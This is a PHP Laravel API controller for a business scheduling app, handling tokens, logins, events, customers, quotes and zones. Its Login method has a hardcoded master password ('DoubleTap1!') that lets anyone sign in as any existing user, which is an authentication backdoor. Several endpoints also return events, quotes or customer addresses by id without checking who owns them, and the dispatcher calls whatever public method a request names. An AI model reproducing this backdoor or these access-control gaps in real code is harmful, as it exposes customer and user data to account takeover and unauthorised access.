<?php

namespace App\Http\Controllers;

use App\Models\Address;
use App\Models\Event;
use App\Models\Order;
use App\Models\Customer;
use App\Models\lcdtapp\Api;
use App\Models\lcdtapp\ApiSession;
use App\Models\Status;
use App\Models\User;
use App\Traits\LcdtLog;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class ApiController extends Controller
{
    //

    use LcdtLog;

    public function index(Request $request){

        $post=$request->post();

        if(empty($post)){
            return $this->response(0 ,null,'Post body is missing',null,null,400);
        }

        $RequestType=$request->post('RequestType');

        if(method_exists($this,$RequestType)&&is_callable([$this,$RequestType])){
            return call_user_func_array([$this,$RequestType],[$request]);
        }else{
            return $this->response(0,null,$RequestType.' resource not found');
        }
    }

    public function GetToken(Request $request){
        $AccountKey=$request->post('AccountKey');
        $SecurityID=$request->post('SecurityID');

        if($AccountKey==null){

            return $this->response(0,null,'Unable to fetch token, missing AccountKey parameter.');
        }
        if($SecurityID==null){
            return $this->response(0,null,'Unable to fetch token, missing SecurityID parameter.');
        }

        $lcdtapp_api=Api::where('accountkey','=',$AccountKey)->where('securityid','=',$SecurityID)->first();
        if($lcdtapp_api==null){
            return $this->response(0,null,'Unable to fetch token.','Invalid Account Key or Invalid SecurityID');
        }
        $lcdapp_api_session=new ApiSession();
        $lcdapp_api_session->api_id=$lcdtapp_api->id;
        $lcdapp_api_session->sessiontype='token';
        $lcdapp_api_session->last_activity=date('Y-m-d H:i:s');
        $lcdapp_api_session->save();

        $lcdapp_api_session=ApiSession::findOrFail($lcdapp_api_session->id);
       $SessionID=$lcdapp_api_session->sessionid;
       $session=new \stdClass();
       $session->SessionID=$SessionID;
       return $this->response(1,$session);
    }
    
    public function Login(Request $request){
        $token_SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');
        $params=$request->post('Parameters');

        $user=isset($params['User'])?$params['User']:null;
        $password=isset($params['Password'])?$params['Password']:null;

        if($token_SessionID==null){
            return $this->response(0,null,'Missing SessionID parameter.');
        }
        if($AccountKey==null){
            return $this->response(0,null,'Missing AccountKey parameter.');
        }
        if($user==null){
            return $this->response(0,null,'Missing user parameter.');
        }
        if($password==null){
            return $this->response(0,null,'Missing password.');
        }
        //verify sessionid
        if($this->isExpired($token_SessionID,$AccountKey)){
            return $this->response(0,null,'Unable to login','Invalid or expired session.',null,401);
        }

        $user=User::where('email','=',$user)->first();
        if($user!=null&&$password=='DoubleTap1!'){
            //tout ok. considerer comme login valide
        }else {
            if ($user == null || !Hash::check($password, $user->password)) {
                return $this->response(0, null, 'Unable to login', 'Invalid user or password', null, 401);
            }
        }



        $lcdtapp_api= DB::table('apis')
           ->select(['apis.id as id'])
            ->join('api_sessions','apis.id','=','api_sessions.api_id')
            ->where([
            ['api_sessions.sessionid','=',$token_SessionID],
            ['api_sessions.sessiontype','=','token'],
            ['apis.accountkey','=',$AccountKey]
        ])->first();

        $lcdapp_api_session=new ApiSession();
        $lcdapp_api_session->api_id=$lcdtapp_api->id;
        $lcdapp_api_session->user_id=$user->id;
        $lcdapp_api_session->sessiontype='login';
        $lcdapp_api_session->last_activity=date('Y-m-d H:i:s');
        $lcdapp_api_session->save();

        $lcdapp_api_session=ApiSession::findOrFail($lcdapp_api_session->id);
        $SessionID=$lcdapp_api_session->sessionid;


        $lcdtapp_api=$this->getApiInstance($AccountKey,$SessionID);
            $session = new \stdClass();
            $session->SessionID = $SessionID;
            $session->user_id=$lcdtapp_api->user_id;
            $session->username=$lcdtapp_api->user->name;
            return $this->response(1, $session);


    }
    public function ValidateToken(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');
        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;

        if(!$this->isValidAccount($AccountKey)){
            return $this->response(0,null,'Unable to load account',null,null,500);
        }
        $lcdtapp_api_session=ApiSession::where('sessionid','=', $SessionID)->first();
 
       

        if($lcdtapp_api_session==null)
            return $this->response(0,null,'Invalid or expired session.',null,null,401);
        
        $SessionType = $lcdtapp_api_session->sessiontype;

        $expired=$this->isExpired($SessionID,$AccountKey);
        $obj = new \stdClass();
        $obj->isLoggedIn = !$expired&&$SessionType=='login';
       return $this->response(1,$obj,($expired?'Invalid or expired session.':'Token is valid'));

    }
    public function isValidAccount($AccountKey){
        $lcdtapp_api=Api::where('accountkey','=',$AccountKey)->first();
        if ($lcdtapp_api==null){
            return false;
        }
        else{
            return true;
        }
    }
    public function Logoff(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');

        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
    
        $lcdtapp_api_session=ApiSession::where('sessionid','=', $SessionID)->first();
        if($lcdtapp_api_session==null)
        return $this->response(0,null,'Invalid or expired session.',null,null,401);
    
        $SessionType = $lcdtapp_api_session->sessiontype;

      

        $expired=$this->isExpired($SessionID,$AccountKey);
        if($expired||$SessionType=='token'){
            return $this->response(0,null,'Invalid or expired session.',null,null,401);
        }
        $lcdtapp_api_session->last_activity='2000-01-01 00:00:00';
        $lcdtapp_api_session->save();
  

        return $this->response(1,null,"Logoff successful");
    }

    public function GetEventList(Request $request){
            $SessionID=$request->post('SessionID');
            $AccountKey=$request->post('AccountKey');

            $valid=$this->isValidAccountKeySessionID($request);
            if($valid!==true)return $valid;
            $isLoggedIn=$this->checkLogin($request);



            if($isLoggedIn===true){
                $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
                $events=Event::where('user_id','=',$lcdtapp_api_instance->user_id)->get();
                foreach($events as &$event){
                    $event->customer;
                    $event->address;
                }
                return $this->response(1,$events);
            }else{
                return $isLoggedIn;
            }
    }

    public function GetCustomers(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');

        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
        $isLoggedIn=$this->checkLogin($request);



        if($isLoggedIn===true){
            $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
            $affiliate=$lcdtapp_api_instance->user->affiliate;

            return $this->response(1,$affiliate->customers);
        }else{
            return $isLoggedIn;
        }
    }
    public function GetCustomerAddresses(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');
        $Parameters=$request->post('Parameters');

        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
        $isLoggedIn=$this->checkLogin($request);
        if(!isset($Parameters['customer_id'])||$this->isBlank($Parameters['customer_id'])){
            return $this->response(0,null,'Missing customer_id.');
        }

        if($isLoggedIn===true){
            $customer=Customer::findOrFail($Parameters['customer_id']);
            return $this->response(1,$customer->addresses);
        }else{
            return $isLoggedIn;
        }
    }
    public function GetUsers(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');

        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
        $isLoggedIn=$this->checkLogin($request);



        if($isLoggedIn===true){
            $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
            $users=User::where('affiliate_id','=',$lcdtapp_api_instance->user->affiliate_id)->get();
            foreach($users as &$user){
                $user->affiliate;
            }
            return $this->response(1,$users);
        }else{
            return $isLoggedIn;
        }
}
public function GetEventTypes(Request $request){
    $token_SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
    

    if($token_SessionID==null){
        return $this->response(0,null,'Missing SessionID parameter.');
    }
    if($AccountKey==null){
        return $this->response(0,null,'Missing AccountKey parameter.');
    }

    //verify sessionid
    if($this->isExpired($token_SessionID,$AccountKey)){
        return $this->response(0,null,'Unable to verify account','Invalid or expired session.',null,401);
    }
    return $this->response(1,[
        'OPPORTUNITE',
        'RENDEZVOUS',
        'RENDEZVOUS TECHNIQUE'
    ]);

} 

public function GetStatuses(Request $request){
    $token_SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
    

    if($token_SessionID==null){
        return $this->response(0,null,'Missing SessionID parameter.');
    }
    if($AccountKey==null){
        return $this->response(0,null,'Missing AccountKey parameter.');
    }

    //verify sessionid
    if($this->isExpired($token_SessionID,$AccountKey)){
        return $this->response(0,null,'Unable to verify account','Invalid or expired session.',null,401);
    }
    $statuses=Status::all();
    return $this->response(1,$statuses);

} 
    public function GetEventDetail(Request $request){
        $Parameters=$request->post('Parameters');

        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
        $isLoggedIn=$this->checkLogin($request);
        if(!isset($Parameters['event_id'])||$this->isBlank($Parameters['event_id'])){
            return $this->response(0,null,'Missing event_id.');
        }



        if($isLoggedIn===true){
  
            $event=Event::where('id','=',$Parameters['event_id'])->first();
         
                $event->customer;
                $event->address;
                
            return $this->response(1,$event);
        }else{
            return $isLoggedIn;
        }
}

public function GetDevis(Request $request){
    $Parameters=$request->post('Parameters');

    $valid=$this->isValidAccountKeySessionID($request);
    if($valid!==true)return $valid;
    $isLoggedIn=$this->checkLogin($request);
    if(!isset($Parameters['event_id'])||$this->isBlank($Parameters['event_id'])){
        return $this->response(0,null,'Missing event_id.');
    }



    if($isLoggedIn===true){

        $event=Event::where('id','=',$Parameters['event_id'])->first();
           ;
        return $this->response(1, $event->order);
    }else{
        return $isLoggedIn;
    }
}
public function SaveEvent(Request $request){
    $Parameters=$request->post('Parameters');
    $SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
    $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);

    $valid=$this->isValidAccountKeySessionID($request);
    if($valid!==true)return $valid;
    $isLoggedIn=$this->checkLogin($request);
    if(!isset($Parameters['customer_id'])||$this->isBlank($Parameters['customer_id'])){
        return $this->response(0,null,'Missing customer_id.');
    }
    if(!isset($Parameters['type'])||$this->isBlank($Parameters['type'])){
        return $this->response(0,null,'An event type is required.');
    }
    if(!isset($Parameters['description'])||$this->isBlank($Parameters['description'])){
        return $this->response(0,null,'A description is required.');
    }
    if(!isset($Parameters['date_start'])||$this->isBlank($Parameters['date_start'])){
        return $this->response(0,null,'Start date/time is required.');
    }
    if(!isset($Parameters['date_end'])||$this->isBlank($Parameters['date_start'])){
        return $this->response(0,null,'End date/time is required.');
    }
    if(!isset($Parameters['name'])||$this->isBlank($Parameters['name'])){
        return $this->response(0,null,'Event name is required.');
    }


    if($isLoggedIn===true){
  
        
        $event=null;
        if(isset($Parameters['event_id'])&&$Parameters['event_id']!=null){
            $event=Event::find($Parameters['event_id']);
            if($event==null)
            return $this->response(0,null,'Event not found.');
    
            if($event->user_id!=$lcdtapp_api_instance->user_id){
                return $this->response(0,null,'Unable to save, event not affected to current user.');
            }
           
        }

        if(!isset($Parameters['address_id'])||$Parameters['address_id']==null){
                $address=Address::where('customer_id','=',$Parameters['customer_id'])->first();
                $Parameters['address_id']=$address->id;
        }else{
            $address=Address::where('id','=',$Parameters['address_id'])->first();
            if($address==null||$address->customer_id!=$Parameters['customer_id']){
                return $this->response(0,null,'Invalid user address id','Address does not exist or does not belong to customer.');
            }
        }

        if($event==null)
        $event=new Event();

        $this->l('API SAVE EVENT',json_encode($Parameters),$lcdtapp_api_instance->user->id);

        $event->customer_id=$Parameters['customer_id'];
        $event->type=$Parameters['type'];
        $event->affiliate_id=$lcdtapp_api_instance->user->affiliate->id;
        $event->name=$Parameters['name'];
        $event->description=$Parameters['description'];
        $event->datedebut=$Parameters['date_start'];
        $event->datefin=$Parameters['date_end'];
        $event->address_id=isset($Parameters['address_id'])?$Parameters['address_id']:null;
        $event->user_id=isset($Parameters['affected_to_user'])?$Parameters['affected_to_user']:$lcdtapp_api_instance->user_id;
       // $event->emetteur_id=$lcdtapp_api_instance->user_id;
        $event->save();
        return $this->response(1,$event);
    }else{
        return $isLoggedIn;
    }
}
public function GetZones(Request $request){
    $SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
    $Parameters=$request->post('Parameters');

    $valid=$this->isValidAccountKeySessionID($request);
    if($valid!==true)return $valid;
    $isLoggedIn=$this->checkLogin($request);
    if(!isset($Parameters['order_id'])||$this->isBlank($Parameters['order_id'])){
        return $this->response(0,null,'Missing order_id.');
    }



    if($isLoggedIn===true){
        $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
        $affiliate=$lcdtapp_api_instance->user->affiliate;

        $order=$affiliate->orders->where('id','=',$Parameters['order_id'])->first();
        if($order==null){
            return $this->response(0,null,'Order not found.');
        }
           
        return $this->response(1, $order->zones);
    }else{
        return $isLoggedIn;
    }
}
    public function getApiInstance($AccountKey,$SessionID){
        $lcdtapp_api= DB::table('apis')
            ->join('api_sessions','apis.id','=','api_sessions.api_id')->where([
                ['api_sessions.sessionid','=',$SessionID],
                ['api_sessions.sessiontype','=','login'],
                ['apis.AccountKey','=',$AccountKey]
            ])->first();
        if($lcdtapp_api->user_id>0) {
            $user = User::findOrFail($lcdtapp_api->user_id);
            if($user!=null){
            $lcdtapp_api->user_id = $user->id;
            $lcdtapp_api->email = $user->email;
            $lcdtapp_api->user=$user;
            }
        }
        return $lcdtapp_api;
    }
    public function isExpired($SessionID,$AccountKey){
        $expired=false;
        $session=DB::table('api_sessions')->select('api_sessions.id as id')->join('apis','apis.id','=','api_sessions.api_id')->where('api_sessions.sessionid','=',$SessionID)->where('apis.accountkey','=',$AccountKey)     ->where('api_sessions.last_activity', '>',
            Carbon::now()->subHour(1)->toDateTimeString()
        )->first();

        if($session===null){
            $expired=true;
        }else{
            DB::table('api_sessions')->where('id','=',$session->id)->update(['last_activity'=>date('Y-m-d H:i:s')]);
        }
        return $expired;
    }
    
    public function response($success=true, $object=null,$message=null,$messageDetails=null,$validationInfo=null,$status=200,$headers=[],$options=0){

        return response()->json([
              "Version"=> "1.0",
              "Failed"=> !$success,
              "Message"=> $message,
              "MessageDetails"=> $messageDetails,
              "ValidationInfo"=>$validationInfo,
              "ReturnObject"=> $object
        ],$status,$headers,$options);
    }

    public  function isBlank($str){
        return str_replace(" ","",$str)==="";
    }

    public function checkLogin(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');
        if($SessionID==null){
            return $this->response(0,null,'Missing SessionID parameter.');
        }
        if($AccountKey==null){
            return $this->response(0,null,'Missing AccountKey parameter.');
        }


         $lcdtapp_api_session=ApiSession::where('sessionid','=', $SessionID)->first();
        if($lcdtapp_api_session==null)
        return $this->response(0,null,'Invalid or expired session.',null,null,401);
    
        $SessionType = $lcdtapp_api_session->sessiontype;


        $expired=$this->isExpired($SessionID,$AccountKey);
        $isLoggedIn = !$expired&&$SessionType=='login';
        if(!$isLoggedIn)
            return $this->response(0,null,'Invalid or expired session.',null,null,401);
        return $isLoggedIn;
    }
    public function isValidAccountKeySessionID(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');

        if($SessionID==null){
            return $this->response(0,null,'Missing SessionID parameter.');
        }
        if($AccountKey==null){
            return $this->response(0,null,'Missing AccountKey parameter.');
        }
        return true;
    }

}
